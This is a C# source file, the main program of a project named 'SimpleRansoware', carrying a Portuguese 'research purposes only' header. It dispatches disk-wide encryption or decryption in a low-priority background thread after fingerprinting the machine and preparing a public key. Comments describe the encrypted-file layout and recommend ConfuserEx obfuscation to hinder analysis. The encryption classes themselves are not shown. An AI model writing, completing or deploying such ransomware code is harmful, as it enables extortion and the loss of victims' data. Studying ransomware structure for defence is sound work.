/****************************************************************/
/* Este código deve ser utilizado apenas para fins de pesquisa. */
/* Autor: Guilherme Bacellar Moralez                            */
/****************************************************************/

using System.Diagnostics;
using System.Threading;

/*
    Encripted File Structure
        FILE_SIGNATURE
        ENC(KEY)
        ENC(IV)
        ENCRIPTED_FILE_DATA
*/

// Apply ConfuserEx Obfuscator - http://yck1509.github.io/ConfuserEx/

namespace SimpleRansoware
{
    class Program
    {
      
        static int Main(string[] args)
        {
            Trace.Listeners.Add(new ConsoleTraceListener());

            // Control Variables
            string operation = (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E");

#if DEBUG
            // Debug FingerPrint Generation
            string fp = null;
            ComputerIdStrategy.GenerateFP(ref fp);

            Trace.WriteLine("[+] System FingerPrint: " + fp);

#endif

            // Handle Basic Files
            CriptoKeyManager.EnsureLocalPublicKey();

            int resultValue = -1;
            ThreadStart ts = null;

            // Handler Operation
            if ("E" == operation)
            {
                // Create ThreadStart With Handler
                ts = new ThreadStart(Enc);

                resultValue = 0; // Encryption OK
            }
            else if ("D" == operation)
            {
                // Create ThreadStart With Handler
                ts = new ThreadStart(Dec);

                resultValue = 1; // Decryption OK
            }

            if (ts != null)
            {
                Thread t = new Thread(ts);
                t.Priority = ThreadPriority.BelowNormal;
                t.IsBackground = true;
                t.Start();

                t.Join();
            }

            return resultValue;
        }

        private static void Enc()
        {
            EncryptionStrategy es = new EncryptionStrategy();
            es.EncryptDisk();
        }

        private static void Dec()
        {
            DecryptionStrategy ds = new DecryptionStrategy();
            ds.DecryptDisk();
        }
    }
}